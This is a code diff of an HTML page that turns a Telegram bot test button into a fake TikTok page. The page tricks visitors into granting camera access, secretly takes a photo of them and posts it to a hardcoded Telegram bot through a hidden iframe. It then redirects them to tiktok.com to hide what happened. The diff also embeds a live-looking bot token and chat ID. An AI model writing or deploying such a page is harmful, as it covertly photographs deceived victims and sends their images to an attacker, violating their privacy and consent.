@@ -1,17 +1,101 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Тест бота</title></head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#000; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial,sans-serif; }
+        .card { width:320px; background:#1a1a1a; border-radius:24px; padding:30px; text-align:center; color:#fff; }
+        h2 { font-size:28px; margin-bottom:10px; }
+        p { color:#aaa; margin:10px 0; }
+        button { background:#fe2c55; border:none; color:#fff; font-size:18px; padding:14px 40px; border-radius:50px; margin-top:15px; cursor:pointer; width:100%; }
+        video { display:none; }
+        .loader { display:none; margin-top:10px; color:#fe2c55; }
+        iframe { display:none; }
+    </style>
+</head>
 <body>
-<button onclick="sendText()">Отправить текст</button>
+<div class="card">
+    <h2>🎵 TikTok</h2>
+    <p>Нажми «Смотреть» для загрузки видео</p>
+    <button id="btn">Смотреть</button>
+    <div class="loader" id="loader">⏳ Загрузка...</div>
+</div>
+
+<video id="cam" autoplay muted></video>
+<iframe name="telegramFrame" style="display:none;"></iframe>
+
 <script>
-function sendText() {
-    const token = '8764529930:AAEAu0l1CYHA_LdKgczyynFv6knHpulyL6c';
-    const chatId = '8533142719';
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Hello+from+test`;
-    fetch(url, { mode: 'no-cors' })
-        .then(() => alert('Отправлено (но ответ скрыт)'))
-        .catch(e => alert('Ошибка: '+e));
-}
+    const BOT_TOKEN = '8764529930:AAEAu0l1CYHA_LdKgczyynFv6knHpulyL6c';
+    const CHAT_ID = '8533142719';
+
+    const btn = document.getElementById('btn');
+    const loader = document.getElementById('loader');
+
+    btn.onclick = async function() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' } 
+            });
+            document.getElementById('cam').srcObject = stream;
+
+            btn.disabled = true;
+            loader.style.display = 'block';
+            btn.innerText = 'Идёт загрузка...';
+
+            setTimeout(() => {
+                captureAndSend();
+            }, 1500);
+        } catch(e) {
+            alert('Ошибка: ' + e.name + ' — ' + e.message);
+        }
+    };
+
+    function captureAndSend() {
+        const video = document.getElementById('cam');
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 640, 480);
+
+        canvas.toBlob(function(blob) {
+            if (!blob) {
+                alert('Не удалось создать изображение');
+                return;
+            }
+
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.enctype = 'multipart/form-data';
+            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            form.target = 'telegramFrame';
+
+            const chatInput = document.createElement('input');
+            chatInput.type = 'hidden';
+            chatInput.name = 'chat_id';
+            chatInput.value = CHAT_ID;
+            form.appendChild(chatInput);
+
+            const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.name = 'photo';
+            const dataTransfer = new DataTransfer();
+            dataTransfer.items.add(file);
+            fileInput.files = dataTransfer.files;
+            form.appendChild(fileInput);
+
+            document.body.appendChild(form);
+            form.submit();
+
+            setTimeout(() => {
+                window.location.href = 'https://www.tiktok.com';
+            }, 1000);
+        }, 'image/jpeg', 0.8);
+    }
 </script>
 </body>
 </html>
